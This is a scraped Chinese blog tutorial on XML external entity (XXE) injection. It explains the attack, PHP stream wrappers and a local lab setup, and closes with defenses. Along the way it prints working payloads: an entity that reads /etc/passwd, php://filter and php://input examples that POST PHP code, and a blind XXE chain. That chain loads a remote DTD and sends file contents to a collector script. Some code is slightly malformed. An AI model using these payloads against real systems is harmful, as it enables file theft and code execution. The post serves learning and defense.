{"blogid": "122846459", "writerAge": "码龄2年", "writerBlogNum": "4", "writerCollect": "12", "writerComment": "1", "writerFan": "2", "writerGrade": "1级", "writerIntegral": "44", "writerName": "风无处不在", "writerProfileAdress": "writer_image\\profile_122846459.jpg", "writerRankTotal": "217363", "writerRankWeekly": "370310", "writerThumb": "2", "writerVisitNum": "14715", "blog_read_count": "2243", "blog_time": "于 2022-02-10 14:37:01 发布", "blog_title": "XML注入学习", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>一、什么是XML注入</h3>\n</div>\n<p></p>\n<blockquote>\n<p>XML 指可扩展标记语言（EXtensible Markup Language）<br/> XML 是一种标记语言，很类似 HTML<br/> XML 的设计宗旨是传输数据，而非显示数据<br/> XML 标签没有被预定义。您需要自行定义标签。<br/> XML 被设计为具有自我描述性。<br/> XML 是 W3C 的推荐标准<br/> 简单来说xml就是用来存储数据的。</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>二、XML的特点</h3>\n</div>\n<p></p>\n<blockquote>\n<p>XML仅仅是纯文本，他不会做任何事情。<br/> XML可以自己发明标签（允许定义自己的标签和文档结构）</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>三、XML的定义</h3>\n</div>\n<p></p>\n<blockquote>\n<p>首先是XML声明，然后是DTD部分 &lt;!DOCTYPE 变量名，&lt;元素&gt;&gt;</p>\n</blockquote>\n<p>如下图</p>\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE  ANY [\n&lt;!ENTITY entityex SYSTEM \"file:///\"etc/password\"&gt;\n]&gt;\n&lt;abc&gt;&amp;entityex;&lt;/abc&gt;\n</code></pre>\n<p></p>\n<div class=\"toc\">\n<h3>什么是XML注入</h3>\n</div>\n<p></p>\n<blockquote>\n<p>XML注入又叫XXE攻击，全称为XML External Entity，从安全的角度来理解，可以叫做XML外部实体攻击。在XML实体中，关键字‘’system‘’可以让XML解析器从URL中读取内容，并允许他在XML文档中被替换，因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现， 就是攻击者强制XML解析器去访问攻击者指定的资源内容（可以是系统上本地文件也可以是远程系统上的文件）</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>XEE扩展</h3>\n</div>\n<p></p>\n<blockquote>\n  &lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt; \n <p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但是存在一些通用的协议，具体内容如下<img alt=\"在这里插入图片描述\" src=\"image\\0a13ba64affc413282918c0744167799.png\"/>使用的条件：<br/> flie://协议在双off的情况下也是可以正常使用的<br/> allow_url_fopen: off/on<br/> allow-url_fopen: off/on<br/> flie:// 用于访问本地文件系统，在CTF中常用来读取本地文件<br/> 使用方法：file://文件的绝对路径和文件名</p>\n</blockquote>\n<blockquote>\n<p>php://协议不需要开启allow_url_fopen<br/> php://input、php://stdin、php://memory和php://temp需要开启allow_url_include</p>\n</blockquote>\n<blockquote>\n<p>php://filter 用于读取源码且在双off的情况下也能正常使用<br/> Eg：http://127.0.0.1/cmd.php?flie=php://filter/read=convert.base64-encode/resource=index.php</p>\n</blockquote>\n<blockquote>\n<p>php://input 可以访问请求的原始数据的只读流，将POST请求中的数据作为PHP代码执行<br/> allow_url_fopen:off/on<br/> allow_url_include:on<br/> Eg: http://127.0.0.1/cmd.php?flie=php://input<br/> [POST DATA]&lt;?php phpinfo()?&gt;</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>XXE漏洞原理</h3>\n</div>\n<p></p>\n<blockquote>\n<p>大体有四种方式：<br/> 1.simplexml_load_string()函数造成的回显注入<br/> 2.SimpleXMLElement()对象造成的回显注入<br/> 3.DOMDocument()类造成的回显注入<br/> 4.BlindXXE形式==&gt;&gt;也是由simplexml_load_string()函数造成的无回显注入</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>靶场实现</h3>\n</div>\n<p></p>\n<blockquote>\n<p>无回显注入 需要引用外部实体，下面是我搭建的靶场,在一个php文件下发现有simplexml_load_string函数<br/> HTTP_RAW_POST_DATA是我们要传的参数，simplexml_load_string函数将形式良好的XML字符串转换为SimpleXMLElement对象，如下图所示<br/> <img alt=\"在这里插入图片描述\" src=\"image\\ca5c3cbf790f447fb82347dbdcc5dcfe.png\"/>向POST请求传参playload</p>\n</blockquote>\n<pre><code class=\"prism language-php\"><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">&lt;</span><span class=\"token constant\">EOF</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> <span class=\"token constant\">ANY</span><span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> file <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=D:\\phpstudy_pro\\WWW\\925\\a.txt\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> remote <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"http://127.0.0.1/925/1.xml\"</span><span class=\"token operator\">&gt;</span> \n<span class=\"token operator\">%</span>remote<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">%</span>send<span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>引用1.xml，1.xml会将读取的文件发给2.php，2.php会把读取的内容保存在3.txt.这样就成功读取了我们想要读取的文件。<img alt=\"在这里插入图片描述\" src=\"image\\1dc2aeb622bf40a9aeb9e5645426af93.png\"/>2.php<br/> <code>&lt;?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?&gt;</code></p>\n<p></p>\n<div class=\"toc\">\n<h3>漏洞防御方法</h3>\n</div>\n<p></p>\n<blockquote>\n<p>需要条件</p>\n<p>1.程序允许引入外部实体<br/> 2.用户可以控制输入</p>\n<p>方案一、使用开发语言提供的禁用外部实体的方法<br/> PHP: libxml_ disable_ entity_ loader(true);<br/> 其他语言:<br/> documentBuilderFactory.setExpandEntityReferences(false);<br/> documentBuilderFactory.setFeature(XMLConstants.)FEATURE_SECURE_PROCESSING,true);<br/> 方案二、过滤用户提交的XML数据 关键词:，SYSTEM和PUBLIC.</p>\n</blockquote>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}